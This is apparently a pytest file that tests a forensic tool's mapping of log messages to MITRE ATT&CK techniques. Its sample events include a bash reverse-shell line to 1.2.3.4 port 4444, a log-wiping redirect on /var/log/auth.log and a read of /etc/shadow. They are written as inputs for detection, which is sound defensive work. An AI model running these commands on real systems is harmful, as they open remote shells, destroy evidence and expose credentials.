import sys
from pathlib import Path
from datetime import datetime, timezone
import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from models.event import ForensicEvent
from stages.stage11_mitre import _map_events, _deduplicate, KEYWORD_MAP


def _make_event(msg, source='syslog', severity='info'):
    return ForensicEvent(
        timestamp  = datetime.now(tz=timezone.utc),
        source     = source,
        event_type = 'test',
        message    = msg,
        severity   = severity,
    )


def test_cron_mapped():
    events = [_make_event('New crontab entry added by root')]
    hits   = _map_events(events, {})
    t_ids  = [h['technique_id'] for h in hits]
    assert 'T1053.003' in t_ids


def test_log_wiping_mapped():
    events = [_make_event('> /var/log/auth.log cleared by user')]
    hits   = _map_events(events, {})
    assert any(h['technique_id'] == 'T1070.002' for h in hits)


def test_brute_force_mapped():
    events = [_make_event('Failed password for invalid user admin from 1.2.3.4')]
    hits   = _map_events(events, {})
    assert any(h['technique_id'].startswith('T1110') for h in hits)


def test_credential_dumping():
    events = [_make_event('Attempted read of /etc/shadow')]
    hits   = _map_events(events, {})
    assert any(h['technique_id'].startswith('T1003') for h in hits)


def test_deduplicate():
    hits = [
        {'technique_id': 'T1053.003', 'confidence': 0.8, 'technique_name': 'Cron',
         'tactics': [], 'event_timestamp': '', 'event_message': '',
         'event_source': '', 'keyword_matched': 'cron'},
        {'technique_id': 'T1053.003', 'confidence': 0.9, 'technique_name': 'Cron',
         'tactics': [], 'event_timestamp': '', 'event_message': '',
         'event_source': '', 'keyword_matched': 'crontab'},
    ]
    result = _deduplicate(hits)
    assert len(result) == 1
    assert result[0]['confidence'] == 0.9


def test_no_false_positive_on_empty():
    events = [_make_event('Normal system startup complete')]
    hits   = _map_events(events, {})
    assert len(hits) == 0


def test_mitre_tags_added_to_event():
    event  = _make_event('bash -i >& /dev/tcp/1.2.3.4/4444')
    _map_events([event], {})
    assert len(event.mitre_tags) > 0
